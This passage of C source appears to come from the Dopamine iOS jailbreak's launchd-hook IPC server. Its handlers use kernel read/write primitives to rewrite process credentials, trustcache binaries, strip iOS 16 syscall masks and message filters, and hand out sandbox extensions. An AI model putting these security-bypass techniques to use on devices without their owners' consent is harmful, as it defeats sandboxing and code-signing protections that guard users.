			.handler = root_steal_ucred,
			.args = (jbserver_arg[]){
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "ucred", .type = JBS_TYPE_UINT64, .out = false },
				{ .name = "org-ucred", .type = JBS_TYPE_UINT64, .out = true },
				{ 0 },
			},
		},
		// JBS_ROOT_SET_MAC_LABEL
		{
			.handler = root_set_mac_label,
			.args = (jbserver_arg[]){
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "slot", .type = JBS_TYPE_UINT64, .out = false },
				{ .name = "label", .type = JBS_TYPE_UINT64, .out = false },
				{ .name = "org-label", .type = JBS_TYPE_UINT64, .out = true },
				{ 0 },
			},
		},
		// JBS_ROOT_TRUSTCACHE_INFO
		{
			.handler = root_trustcache_info,
			.args = (jbserver_arg[]){
				{ .name = "tc-info", .type = JBS_TYPE_ARRAY, .out = true },
				{ 0 },
			},
		},
		// JBS_ROOT_ADD_CDHASH
		{
			.handler = root_trustcache_add_cdhash,
			.args = (jbserver_arg[]){
				{ .name = "cdhash", .type = JBS_TYPE_DATA, .out = false },
				{ 0 },
			},
		},
		// JBS_ROOT_TRUSTCACHE_CLEAR
		{
			.handler = root_trustcache_clear,
			.args = (jbserver_arg[]){
				{ 0 },
			},
		},
		{ 0 },
	},
};

```

`BaseBin/launchdhook/src/jbserver/jbdomain_systemwide.c`:

```c
#include "jbserver_global.h"
#include "jbsettings.h"
#include <libjailbreak/info.h>
#include <sandbox.h>
#include <libproc.h>
#include <sys/proc_info.h>

#include <libjailbreak/signatures.h>
#include <libjailbreak/trustcache.h>
#include <libjailbreak/kernel.h>
#include <libjailbreak/util.h>
#include <libjailbreak/primitives.h>
#include <libjailbreak/codesign.h>

bool gSystemwideDomainEnabled = true;
void systemwide_domain_set_enabled(bool enabled)
{
	gSystemwideDomainEnabled = enabled;
}

extern bool string_has_prefix(const char *str, const char* prefix);
extern bool string_has_suffix(const char* str, const char* suffix);

char *combine_strings(char separator, char **components, int count)
{
	if (count <= 0) return NULL;

	bool isFirst = true;

	size_t outLength = 1;
	for (int i = 0; i < count; i++) {
		if (components[i]) {
			outLength += !isFirst + strlen(components[i]);
			if (isFirst) isFirst = false;
		}
	}

	isFirst = true;
	char *outString = malloc(outLength * sizeof(char));
	*outString = 0;

	for (int i = 0; i < count; i++) {
		if (components[i]) {
			if (isFirst) {
				strlcpy(outString, components[i], outLength);
				isFirst = false;
			}
			else {
				char separatorString[2] = { separator, 0 };
				strlcat(outString, (char *)separatorString, outLength);
				strlcat(outString, components[i], outLength);
			}
		}
	}

	return outString;
}

bool systemwide_domain_allowed(audit_token_t clientToken)
{
	if (!gSystemwideDomainEnabled) {
		// While the jailbreak is hidden, we need to disable the systemwide domain
		pid_t pid = audit_token_to_pid(clientToken);
		char procPath[4*MAXPATHLEN];
		if (proc_pidpath(pid, procPath, sizeof(procPath)) <= 0) {
			return false;
		}

		if (string_has_suffix(procPath, "/Dopamine.app/Dopamine")) {
			// We still want it to be accessible by Dopamine itself though
			// Unfortunately, there is not really a better check here since
			// - Dopamine can be sideloaded, so no control over entitlements
			// - App identifier could be changed by whoever installed it aswell
			return true;
		}

		return false;
	}
	return true;
}

static int systemwide_get_jbroot(char **rootPathOut)
{
	*rootPathOut = strdup(jbinfo(rootPath));
	return 0;
}

static int systemwide_get_boot_uuid(char **bootUUIDOut)
{
	const char *launchdUUID = getenv("LAUNCHD_UUID");
	*bootUUIDOut = launchdUUID ? strdup(launchdUUID) : NULL;
	return 0;
}

CS_SuperBlob *siginfo_resolve_superblob(struct siginfo *siginfo, int pid, int fd)
{
	if (!siginfo) return NULL;
	if (siginfo->signature.fs_blob_size == 0) return NULL;

	size_t superblobSize = siginfo->signature.fs_blob_size;
	CS_SuperBlob *superblob = malloc(superblobSize);
	if (!superblob) return NULL;

	bool success = false;

	switch (siginfo->source) {
		case SIGNATURE_SOURCE_FILE: {
			uintptr_t superblobStart = siginfo->signature.fs_file_start + (uintptr_t)siginfo->signature.fs_blob_start;
			uintptr_t superblobEnd   = superblobStart + superblobSize;
			struct stat st = {};

        	if (fstat(fd, &st) != 0) break;
			if (superblobEnd > st.st_size) break;
			if (lseek(fd, superblobStart, SEEK_SET) != superblobStart) break;
			if (read(fd, superblob, superblobSize) != superblobSize) break;

			success = true;
		}
		case SIGNATURE_SOURCE_PROC: {
			uint64_t proc = proc_find(pid);

			if (!proc) break;
			if (proc_vreadbuf(proc, siginfo->signature.fs_blob_start, superblob, superblobSize) != 0) break;

			success = true;
		}
	}

	if (!success) {
		free(superblob);
		superblob = NULL;
	}

	return superblob;
}

int systemwide_trust_file(audit_token_t *processToken, int rfd, struct siginfo *siginfo, size_t siginfoSize)
{
	if (siginfo && siginfoSize != sizeof(struct siginfo)) return -1;

	pid_t pid = -1;
	int fd = -1;
	if (!processToken) {
		pid = 1;
		fd = dup(rfd);
	}
	else {
		pid = audit_token_to_pid(*processToken);
		struct vnode_fdinfowithpath vnodeInfo;
		int ok = proc_pidfdinfo(pid, rfd, PROC_PIDFDVNODEPATHINFO, &vnodeInfo, sizeof(vnodeInfo));
		if (ok > 0) {
			fd = open(vnodeInfo.pvip.vip_path, O_RDONLY);
		}
	}

	if (fd < 0) return -1;

	struct statfs fsb;
	int fsr = fstatfs(fd, &fsb);
	if (fsr == 0) {
		// Anything on the rootfs or fakelib mount point can be ignored as it's guaranteed to already be in trustcache
		if (!strcmp(fsb.f_mntonname, "/") || !strcmp(fsb.f_mntonname, "/usr/lib")) {
			close(fd);
			return 0;
		}
	}

	cdhash_t *cdhashes = NULL;
	uint32_t cdhashesCount = 0;

	if (siginfo) {
		// If we were passed a siginfo, get the cdhash of the superblob from the siginfo
		CS_SuperBlob *superblob = siginfo_resolve_superblob(siginfo, pid, fd);
		if (superblob) {
			cdhash_t cdhash;
			if (code_signature_calculate_adhoc_cdhash(superblob, cdhash)) {
				if (!is_cdhash_trustcached(cdhash)) {
					cdhashes = malloc(sizeof(cdhash_t));
					cdhashesCount = 1;
					memcpy(&cdhashes[0], &cdhash, sizeof(cdhash_t));
				}
			}
			free(superblob);
		}
	}
	else {
		// If we weren't passed a siginfo, get cdhashes of all slices
		file_collect_untrusted_cdhashes(fd, &cdhashes, &cdhashesCount);
	}
	
	if (cdhashes && cdhashesCount > 0) {
		jb_trustcache_add_cdhashes(cdhashes, cdhashesCount);
		free(cdhashes);
	}

	close(fd);
	return 0;
}

int systemwide_trust_file_by_path(const char *path)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0) return -1;
	int r = systemwide_trust_file(NULL, fd, NULL, 0);
	close(fd);
	return r;
}

int systemwide_process_checkin(audit_token_t *processToken, char **rootPathOut, char **bootUUIDOut, char **sandboxExtensionsOut, bool *fullyDebuggedOut)
{
	// Fetch process info
	pid_t pid = audit_token_to_pid(*processToken);
	char procPath[4*MAXPATHLEN];
	if (proc_pidpath(pid, procPath, sizeof(procPath)) <= 0) {
		return -1;
	}

	// Find proc in kernelspace
	uint64_t proc = proc_find(pid);
	if (!proc) {
		return -1;
	}

	// Get jbroot and boot uuid
	systemwide_get_jbroot(rootPathOut);
	systemwide_get_boot_uuid(bootUUIDOut);

	// Generate sandbox extensions for the requesting process
	char *sandboxExtensionsArr[] = {
		// Make /var/jb readable and executable
		sandbox_extension_issue_file_to_process("com.apple.app-sandbox.read", JBROOT_PATH(""), 0, *processToken),
		sandbox_extension_issue_file_to_process("com.apple.sandbox.executable", JBROOT_PATH(""), 0, *processToken),

		// Make /var/jb/var/mobile writable
		sandbox_extension_issue_file_to_process("com.apple.app-sandbox.read-write", JBROOT_PATH("/var/mobile"), 0, *processToken),
	};
	int sandboxExtensionsCount = sizeof(sandboxExtensionsArr) / sizeof(char *);
	*sandboxExtensionsOut = combine_strings('|', sandboxExtensionsArr, sandboxExtensionsCount);
	for (int i = 0; i < sandboxExtensionsCount; i++) {
		if (sandboxExtensionsArr[i]) {
			free(sandboxExtensionsArr[i]);
		}
	}

	bool fullyDebugged = false;
	if (string_has_prefix(procPath, "/private/var/containers/Bundle/Application") || string_has_prefix(procPath, JBROOT_PATH("/Applications"))) {
		// This is an app, enable CS_DEBUGGED based on user preference
		if (jbsetting(markAppsAsDebugged)) {
			fullyDebugged = true;
		}
	}
	*fullyDebuggedOut = fullyDebugged;

	// Allow invalid pages
	cs_allow_invalid(proc, fullyDebugged);

	// Fix setuid
	struct stat sb;
	if (stat(procPath, &sb) == 0) {
		if (S_ISREG(sb.st_mode) && (sb.st_mode & (S_ISUID | S_ISGID))) {
			uint64_t ucred = proc_ucred(proc);
			if ((sb.st_mode & (S_ISUID))) {
				kwrite32(proc + koffsetof(proc, svuid), sb.st_uid);
				kwrite32(ucred + koffsetof(ucred, svuid), sb.st_uid);
				kwrite32(ucred + koffsetof(ucred, uid), sb.st_uid);
			}
			if ((sb.st_mode & (S_ISGID))) {
				kwrite32(proc + koffsetof(proc, svgid), sb.st_gid);
				kwrite32(ucred + koffsetof(ucred, svgid), sb.st_gid);
				kwrite32(ucred + koffsetof(ucred, groups), sb.st_gid);
			}
			uint32_t flag = kread32(proc + koffsetof(proc, flag));
			if ((flag & P_SUGID) != 0) {
				flag &= ~P_SUGID;
				kwrite32(proc + koffsetof(proc, flag), flag);
			}
		}
	}

	if (__builtin_available(iOS 16.0, *)) {
		// In iOS 16+ there is a super annoying security feature called Protobox
		// Amongst other things, it allows for a process to have a syscall mask
		// If a process calls a syscall it's not allowed to call, it immediately crashes
		// Because for tweaks and hooking this is unacceptable, we update these masks to be 1 for all syscalls on all processes
		// That will at least get rid of the syscall mask part of Protobox
		proc_allow_all_syscalls(proc);

		// Some processes also have a filter for mach messages, fortunately there is one allowed message id that can be used for the check-in
		// Then we remove the filter to make other message ids accessible afterwards aswell
		proc_remove_msg_filter(proc);
	}

	// For whatever reason after SpringBoard has restarted, AutoFill and other stuff stops working
	// The fix is to always also restart the kbd daemon alongside SpringBoard
	// Seems to be something sandbox related where kbd doesn't have the right extensions until restarted
	if (strcmp(procPath, "/System/Library/CoreServices/SpringBoard.app/SpringBoard") == 0) {
		static bool springboardStartedBefore = false;
		if (!springboardStartedBefore) {
			// Ignore the first SpringBoard launch after userspace reboot
			// This fix only matters when SpringBoard gets restarted during runtime
			springboardStartedBefore = true;
		}
		else {
			dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
				killall("/System/Library/TextInput/kbd", SIGKILL);
			});
		}
	}
	// For the Dopamine app itself we want to give it a saved uid/gid of 0, unsandbox it and give it CS_PLATFORM_BINARY
	// This is so that the buttons inside it can work when jailbroken, even if the app was not installed by TrollStore
	else if (string_has_suffix(procPath, "/Dopamine.app/Dopamine")) {
		// svuid = 0, svgid = 0
		uint64_t ucred = proc_ucred(proc);
		kwrite32(proc + koffsetof(proc, svuid), 0);
		kwrite32(ucred + koffsetof(ucred, svuid), 0);
		kwrite32(proc + koffsetof(proc, svgid), 0);
		kwrite32(ucred + koffsetof(ucred, svgid), 0);

		// platformize
		proc_csflags_set(proc, CS_PLATFORM_BINARY);
	}

#ifdef __arm64e__
	// On arm64e every image has a trust level associated with it
	// "In trust cache" trust levels have higher runtime enforcements, this can be a problem for some tools as Dopamine trustcaches everything that's adhoc signed
	// So we add the ability for a binary to get a different trust level using the "jb.pmap_cs_custom_trust" entitlement
	// This is for binaries that rely on weaker PMAP_CS checks (e.g. Lua trampolines need it)
	xpc_object_t customTrustObj = xpc_copy_entitlement_for_token("jb.pmap_cs.custom_trust", processToken);
	if (customTrustObj) {
		if (xpc_get_type(customTrustObj) == XPC_TYPE_STRING) {
			const char *customTrustStr = xpc_string_get_string_ptr(customTrustObj);
			uint32_t customTrust = pmap_cs_trust_string_to_int(customTrustStr);
			if (customTrust >= 2) {
				uint64_t mainCodeDir = proc_find_main_binary_code_dir(proc);
				if (mainCodeDir) {
					kwrite32(mainCodeDir + koffsetof(pmap_cs_code_directory, trust), customTrust);
				}
			}
		}
	}
#endif

	proc_rele(proc);
	return 0;
}

int systemwide_fork_fix(audit_token_t *parentToken, uint64_t childPid)
{
	int retval = 3;
	uint64_t parentPid = audit_token_to_pid(*parentToken);
	uint64_t parentProc = proc_find(parentPid);
	uint64_t childProc = proc_find(childPid);

	if (childProc && parentProc) {
		retval = 2;
		// Safety check to ensure we are actually coming from fork
		if (kread_ptr(childProc + koffsetof(proc, pptr)) == parentProc) {
			cs_allow_invalid(childProc, false);

			uint64_t childTask  = proc_task(childProc);
			uint64_t childVmMap = kread_ptr(childTask + koffsetof(task, map));

			uint64_t parentTask  = proc_task(parentProc);
			uint64_t parentVmMap = kread_ptr(parentTask + koffsetof(task, map));

			uint64_t parentHeader = kread_ptr(parentVmMap  + koffsetof(vm_map, hdr));
			uint64_t parentEntry  = kread_ptr(parentHeader + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, next));

			uint64_t childHeader  = kread_ptr(childVmMap  + koffsetof(vm_map, hdr));
			uint64_t childEntry   = kread_ptr(childHeader + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, next));

			uint64_t childFirstEntry = childEntry, parentFirstEntry = parentEntry;
			do {
				uint64_t childStart  = kread_ptr(childEntry  + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, min));
				uint64_t childEnd    = kread_ptr(childEntry  + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, max));
				uint64_t parentStart = kread_ptr(parentEntry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, min));
				uint64_t parentEnd   = kread_ptr(parentEntry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, max));

				if (parentStart < childStart) {
					parentEntry = kread_ptr(parentEntry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
				}
				else if (parentStart > childStart) {
					childEntry = kread_ptr(childEntry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
				}
				else {
					uint64_t parentFlags = kread64(parentEntry + koffsetof(vm_map_entry, flags));
					uint64_t childFlags  = kread64(childEntry  + koffsetof(vm_map_entry, flags));

					uint8_t parentProt = VM_FLAGS_GET_PROT(parentFlags), parentMaxProt = VM_FLAGS_GET_MAXPROT(parentFlags);
					uint8_t childProt  = VM_FLAGS_GET_PROT(childFlags),  childMaxProt  = VM_FLAGS_GET_MAXPROT(childFlags);

					if (parentProt != childProt || parentMaxProt != childMaxProt) {
						VM_FLAGS_SET_PROT(childFlags, parentProt);
						VM_FLAGS_SET_MAXPROT(childFlags, parentMaxProt);
						kwrite64(childEntry + koffsetof(vm_map_entry, flags), childFlags);
					}

					parentEntry = kread_ptr(parentEntry + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
					childEntry  = kread_ptr(childEntry  + koffsetof(vm_map_entry, links) + koffsetof(vm_map_links, next));
				}
			} while (parentEntry != 0 && childEntry != 0 && parentEntry != parentFirstEntry && childEntry != childFirstEntry);
			retval = 0;
		}
	}
	if (childProc)  proc_rele(childProc);
	if (parentProc) proc_rele(parentProc);

	return retval;
}

static int systemwide_cs_revalidate(audit_token_t *callerToken)
{
	uint64_t callerPid = audit_token_to_pid(*callerToken);
	if (callerPid > 0) {
		uint64_t callerProc = proc_find(callerPid);
		if (callerProc) {
			proc_csflags_set(callerProc, CS_VALID);
			return 0;
		}
	}
	return -1;
}

struct jbserver_domain gSystemwideDomain = {
	.permissionHandler = systemwide_domain_allowed,
	.actions = {
		// JBS_SYSTEMWIDE_GET_JBROOT
		{
			.handler = systemwide_get_jbroot,
			.args = (jbserver_arg[]){
				{ .name = "root-path", .type = JBS_TYPE_STRING, .out = true },
				{ 0 },
			},
		},
		// JBS_SYSTEMWIDE_GET_BOOT_UUID
		{
			.handler = systemwide_get_boot_uuid,
			.args = (jbserver_arg[]){
				{ .name = "boot-uuid", .type = JBS_TYPE_STRING, .out = true },
				{ 0 },
			},
		},
		// JBS_SYSTEMWIDE_TRUST_FILE
		{
			.handler = systemwide_trust_file,
			.args = (jbserver_arg[]){
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "fd", .type = JBS_TYPE_UINT64, .out = false },
				{ .name = "siginfo", .type = JBS_TYPE_DATA, .out = false },
				{ 0 },
			},
		},
		// JBS_SYSTEMWIDE_PROCESS_CHECKIN
		{
			.handler = systemwide_process_checkin,
			.args = (jbserver_arg[]) {
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "root-path", .type = JBS_TYPE_STRING, .out = true },
				{ .name = "boot-uuid", .type = JBS_TYPE_STRING, .out = true },
				{ .name = "sandbox-extensions", .type = JBS_TYPE_STRING, .out = true },
				{ .name = "fully-debugged", .type = JBS_TYPE_BOOL, .out = true },
				{ 0 },
			},
		},
		// JBS_SYSTEMWIDE_FORK_FIX
		{
			.handler = systemwide_fork_fix,
			.args = (jbserver_arg[]) {
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "child-pid", .type = JBS_TYPE_UINT64, .out = false },
				{ 0 },
			},
		},
		// JBS_SYSTEMWIDE_CS_REVALIDATE
		{
			.handler = systemwide_cs_revalidate,
			.args = (jbserver_arg[]) {
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ 0 },
			},
		},
		// JBS_SYSTEMWIDE_JBSETTINGS_GET
		{
			.handler = jbsettings_get,
			.args = (jbserver_arg[]){
				{ .name = "key", .type = JBS_TYPE_STRING, .out = false },
				{ .name = "value", .type = JBS_TYPE_XPC_GENERIC, .out = true },
			},
		},
		{ 0 },
	},
};
```

`BaseBin/launchdhook/src/jbserver/jbdomain_watchdog.c`:

```c
#include "jbserver_global.h"

#include <stdio.h>
#include <time.h>
#include <libjailbreak/util.h>
#include "../crashreporter.h"

static bool watchdog_domain_allowed(audit_token_t clientToken)
{
	xpc_object_t entitlementValue = xpc_copy_entitlement_for_token("com.apple.private.iowatchdog.user-access", &clientToken);
	if (entitlementValue && xpc_get_type(entitlementValue) == XPC_TYPE_BOOL) {
		return xpc_bool_get_value(entitlementValue);
	}
	return false;
}

static int watchdog_intercept_userspace_panic(const char *panicMessage)
{
	FILE *outFile = crashreporter_open_outfile("userspace-panic", NULL);
	if (outFile) {
		fprintf(outFile, "\n%s", panicMessage);
		fprintf(outFile, "\n\nThis panic was prevented by Dopamine and a userspace reboot was done instead.");
		crashreporter_save_outfile(outFile);
	}

	setenv("WATCHDOG_PANIC_MESSAGE", panicMessage, 1);
	FILE *touchFile = fopen(JBROOT_PATH("/basebin/.safe_mode"), "w");
	fclose(touchFile);

	return 0;
}

static int watchdog_get_last_userspace_panic(char **panicMessage)
{
	char *messageInEnv = getenv("WATCHDOG_PANIC_MESSAGE");
	if (messageInEnv) {
		*panicMessage = strdup(messageInEnv);
		unsetenv("WATCHDOG_PANIC_MESSAGE");
		return 0;
	}
	else {
		*panicMessage = NULL;
		return 1;
	}
}

struct jbserver_domain gWatchdogDomain = {
	.permissionHandler = watchdog_domain_allowed,
	.actions = {
		// JBS_WATCHDOG_INTERCEPT_USERSPACE_PANIC
		{
			.handler = watchdog_intercept_userspace_panic,
			.args = (jbserver_arg[]){
				{ .name = "panic-message", .type = JBS_TYPE_STRING, .out = false },
				{ 0 },
			},
		},
		// JBS_WATCHDOG_GET_LAST_USERSPACE_PANIC
		{
			.handler = watchdog_get_last_userspace_panic,
			.args = (jbserver_arg[]){
				{ .name = "panic-message", .type = JBS_TYPE_STRING, .out = true },
				{ 0 },
			},
		},
		{ 0 },
	},
};
```

`BaseBin/launchdhook/src/jbserver/jbserver_global.c`:

```c
#include <libjailbreak/jbserver.h>

extern struct jbserver_domain gSystemwideDomain;
extern struct jbserver_domain gPlatformDomain;
extern struct jbserver_domain gWatchdogDomain;
extern struct jbserver_domain gRootDomain;

struct jbserver_impl gGlobalServer = {
	.maxDomain = 1,
	.domains = (struct jbserver_domain*[]){
		&gSystemwideDomain,
		&gPlatformDomain,
		&gWatchdogDomain,
		&gRootDomain,
		NULL,
	}
};
```

`BaseBin/launchdhook/src/jbserver/jbserver_global.h`:

```h
#ifndef JBSERVER_XPC_H
#define JBSERVER_XPC_H

#include <libjailbreak/jbserver.h>
#include <xpc/xpc.h>

int jbserver_received_xpc_message(struct jbserver_impl *server, xpc_object_t xmsg);
#endif

```

`BaseBin/launchdhook/src/jbserver/jbserver_local.c`:

```c
#include "jbserver_global.h"
#include <libjailbreak/jbserver.h>
#include <pthread.h>

volatile bool gLocalJBServerRunning = false;
pthread_t gLocalJBServerThread = NULL;
mach_port_t gLocalJBServerPort = MACH_PORT_NULL;

void *jbserver_local_loop(void *arg)
{
	while (gLocalJBServerRunning) {
		xpc_object_t xdict = NULL;
		if (!xpc_pipe_receive(gLocalJBServerPort, &xdict)) {
			jbserver_received_xpc_message(&gGlobalServer, xdict);
			xpc_release(xdict);
		}
	}
	return NULL;
}

mach_port_t jbserver_local_start(void)
{
	if (gLocalJBServerRunning) return gLocalJBServerPort;

	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gLocalJBServerPort);
	mach_port_insert_right(mach_task_self(), gLocalJBServerPort, gLocalJBServerPort, MACH_MSG_TYPE_MAKE_SEND);

	gLocalJBServerRunning = true;
	pthread_create(&gLocalJBServerThread, NULL, (void *(*)(void *))jbserver_local_loop, NULL);

	return gLocalJBServerPort;
}

void jbserver_local_stop(void)
{
	if (!gLocalJBServerRunning) return;

	gLocalJBServerRunning = false;
	
	// Send a message to server to wake the thread up (which will make it exit since gLocalJBServerRunning is false)
	mach_msg_header_t h;
	h.msgh_bits = MACH_MSGH_BITS_REMOTE(MACH_MSG_TYPE_MAKE_SEND);
	h.msgh_size = sizeof(h);
	h.msgh_remote_port = gLocalJBServerPort;
	h.msgh_local_port = MACH_PORT_NULL;
	mach_msg_send(&h);

	// Now, wait for it to finish
	void *r;
	pthread_join(gLocalJBServerThread, &r);

	mach_port_deallocate(mach_task_self(), gLocalJBServerPort);
	gLocalJBServerPort = MACH_PORT_NULL;
	gLocalJBServerThread = NULL;
}
```

`BaseBin/launchdhook/src/jbserver/jbserver_local.h`:

```h
#ifndef __JBSERVER_LOCAL
#define __JBSERVER_LOCAL

mach_port_t jbserver_local_start(void);
void jbserver_local_stop(void);

#endif
```

`BaseBin/launchdhook/src/jbserver/jbserver_mach.c`:

```c
#include <libjailbreak/jbserver.h>
#include <mach/mach.h>
#include <bsm/audit.h>
#include <libproc.h>
#include <sys/proc_info.h>
extern int fileport_makefd (mach_port_t port);

int systemwide_process_checkin(audit_token_t *processToken, char **rootPathOut, char **bootUUIDOut, char **sandboxExtensionsOut, bool *fullyDebuggedOut);
int systemwide_fork_fix(audit_token_t *parentToken, uint64_t childPid);
int systemwide_trust_file(audit_token_t *processToken, int rfd, struct siginfo *siginfo, size_t siginfoSize);

bool systemwide_domain_allowed(audit_token_t clientToken);

int jbserver_send_mach_reply(mach_msg_header_t *hdr, void *replyData)
{
	kern_return_t kr = -1;

	if (replyData && MACH_PORT_VALID(hdr->msgh_remote_port) && MACH_MSGH_BITS_REMOTE(hdr->msgh_bits) != 0) {
		struct jbserver_mach_msg_reply *reply = (struct jbserver_mach_msg_reply *)replyData;

		// Send reply
		uint32_t bits = MACH_MSGH_BITS_REMOTE(hdr->msgh_bits);
		if (bits == MACH_MSG_TYPE_COPY_SEND)
			bits = MACH_MSG_TYPE_MOVE_SEND;
		
		reply->msg.hdr.msgh_bits = MACH_MSGH_BITS(bits, 0);
		// size already set
		reply->msg.hdr.msgh_remote_port  = hdr->msgh_remote_port;
		reply->msg.hdr.msgh_local_port   = 0;
		reply->msg.hdr.msgh_voucher_port = 0;
		reply->msg.hdr.msgh_id           = hdr->msgh_id + 100;
		
		kr = mach_msg_send(&reply->msg.hdr);
		if (kr == KERN_SUCCESS /*|| kr == MACH_SEND_INVALID_MEMORY || kr == MACH_SEND_INVALID_RIGHT || kr == MACH_SEND_INVALID_TYPE || kr == MACH_SEND_MSG_TOO_SMALL*/) {
			// All of these imply the message was either sent or destroyed
			// -> Kill the reply port in the original message as we certainly got rid of the associated right
			hdr->msgh_remote_port = 0;
			hdr->msgh_bits = hdr->msgh_bits & ~MACH_MSGH_BITS_REMOTE_MASK;
		}
	}

	return kr;
}

int jbserver_received_mach_message(audit_token_t *auditToken, struct jbserver_mach_msg *jbsMachMsg)
{
	int r = -1;

	// Anything implemented by the mach server is provided systemwide
	// So we also need to honor the allowed handler of the systemwide domain
	if (!systemwide_domain_allowed(*auditToken)) return -1;

	uint64_t msgSize = jbsMachMsg->hdr.msgh_size;
	void *replyData = NULL;

	if (jbsMachMsg->action == JBSERVER_MACH_CHECKIN) {
		if (msgSize < sizeof(struct jbserver_mach_msg_checkin)) return -1;
		struct jbserver_mach_msg_checkin *checkinMsg = (struct jbserver_mach_msg_checkin *)jbsMachMsg;

		size_t replySize = sizeof(struct jbserver_mach_msg_checkin_reply);
		replyData = malloc(replySize);
		struct jbserver_mach_msg_checkin_reply *reply = (struct jbserver_mach_msg_checkin_reply *)replyData;
		memset(reply, 0, replySize);
		
		char *jbRootPath = NULL, *bootUUID = NULL, *sandboxExtensions = NULL;
		bool fullyDebugged = false;
		int result = systemwide_process_checkin(auditToken, &jbRootPath, &bootUUID, &sandboxExtensions, &reply->fullyDebugged);

		reply->base.msg.magic         = jbsMachMsg->magic;
		reply->base.msg.action        = jbsMachMsg->action;
		reply->base.msg.hdr.msgh_size = replySize;

		if (jbRootPath) {
			strlcpy(reply->jbRootPath, jbRootPath, sizeof(reply->jbRootPath));
			free(jbRootPath);
		}
		if (bootUUID) {
			strlcpy(reply->bootUUID, bootUUID, sizeof(reply->bootUUID));
			free(bootUUID);
		}
		if (sandboxExtensions) {
			strlcpy(reply->sandboxExtensions, sandboxExtensions, sizeof(reply->sandboxExtensions));
			free(sandboxExtensions);
		}

		reply->base.status = result;
		r = 0;
	}
	else if (jbsMachMsg->action == JBSERVER_MACH_FORK_FIX) {
		if (msgSize < sizeof(struct jbserver_mach_msg_forkfix)) return -1;
		struct jbserver_mach_msg_forkfix *forkfixMsg = (struct jbserver_mach_msg_forkfix *)jbsMachMsg;

		size_t replySize = sizeof(struct jbserver_mach_msg_forkfix_reply);
		replyData = malloc(replySize);
		struct jbserver_mach_msg_forkfix_reply *reply = (struct jbserver_mach_msg_forkfix_reply *)replyData;
		memset(reply, 0, replySize);
		
		int result = systemwide_fork_fix(auditToken, forkfixMsg->childPid);

		reply->base.msg.magic         = jbsMachMsg->magic;
		reply->base.msg.action        = jbsMachMsg->action;
		reply->base.msg.hdr.msgh_size = replySize;

		reply->base.status = result;
		r = 0;
	}
	else if (jbsMachMsg->action == JBSERVER_MACH_TRUST_FILE) {
		if (msgSize < sizeof(struct jbserver_mach_msg_trust_fd)) return -1;
		struct jbserver_mach_msg_trust_fd *trustMsg = (struct jbserver_mach_msg_trust_fd *)jbsMachMsg;

		size_t replySize = sizeof(struct jbserver_mach_msg_trust_fd_reply);
		replyData = malloc(replySize);
		struct jbserver_mach_msg_trust_fd_reply *reply = (struct jbserver_mach_msg_trust_fd_reply *)replyData;
		memset(reply, 0, replySize);

		int result = systemwide_trust_file(auditToken, trustMsg->fd, trustMsg->siginfoPopulated ? &trustMsg->siginfo : NULL, sizeof(struct siginfo));

		reply->base.msg.magic         = jbsMachMsg->magic;
		reply->base.msg.action        = jbsMachMsg->action;
		reply->base.msg.hdr.msgh_size = replySize;

		reply->base.status = result;
		r = 0;
	}

	jbserver_send_mach_reply(&jbsMachMsg->hdr, replyData);

	if (replyData) free(replyData);

	return r;
}

/*int jbserver_received_complex_mach_message(audit_token_t *auditToken, uint64_t action, struct jbserver_mach_complex_msg *jbsComplexMachMsg)
{
	int r = -1;

	// Anything implemented by the mach server is provided systemwide
	// So we also need to honor the allowed handler of the systemwide domain
	if (!systemwide_domain_allowed(*auditToken)) return -1;

	uint64_t msgSize = jbsComplexMachMsg->hdr.msgh_size;
	void *replyData = NULL;

	if (action == JBSERVER_MACH_TRUST_FILE) {
		if (msgSize < sizeof(struct jbserver_mach_msg_trust_fd)) return -1;
		struct jbserver_mach_msg_trust_fd *trustFdMsg = (struct jbserver_mach_msg_trust_fd *)jbsComplexMachMsg;
		if (trustFdMsg->base.body.msgh_descriptor_count != 1) return -1;

		int fd = fileport_makefd(trustFdMsg->fdPort.name);
		if (fd < 0) return -1;

		size_t replySize = sizeof(struct jbserver_mach_msg_trust_fd_reply);
		replyData = malloc(replySize);
		struct jbserver_mach_msg_trust_fd_reply *reply = (struct jbserver_mach_msg_trust_fd_reply *)replyData;
		memset(reply, 0, replySize);

		int result = systemwide_trust_file(fd);
		close(fd);

		reply->base.msg.magic         = JBSERVER_MACH_MAGIC;
		reply->base.msg.action        = action;
		reply->base.msg.hdr.msgh_size = replySize;

		reply->base.status = result;
		r = 0;
	}

	jbserver_send_mach_reply(&jbsComplexMachMsg->hdr, replyData);

	if (replyData) free(replyData);

	return r;
}*/
```

`BaseBin/launchdhook/src/jbserver/jbsettings.c`:

```c
#include "jbsettings.h"
#include <libjailbreak/info.h>

int jbsettings_get(const char *key, xpc_object_t *valueOut)
{
	if (!strcmp(key, "markAppsAsDebugged")) {
		*valueOut = xpc_bool_create(jbsetting(markAppsAsDebugged));
		return 0;
	}
	else if (!strcmp(key, "jetsamMultiplier")) {
		*valueOut = xpc_double_create(jbsetting(jetsamMultiplier));
		return 0;
	}
	return -1;
}

int jbsettings_set(const char *key, xpc_object_t value)
{
	if (!strcmp(key, "markAppsAsDebugged") && xpc_get_type(value) == XPC_TYPE_BOOL) {
		gSystemInfo.jailbreakSettings.markAppsAsDebugged = xpc_bool_get_value(value);
		return 0;
	}
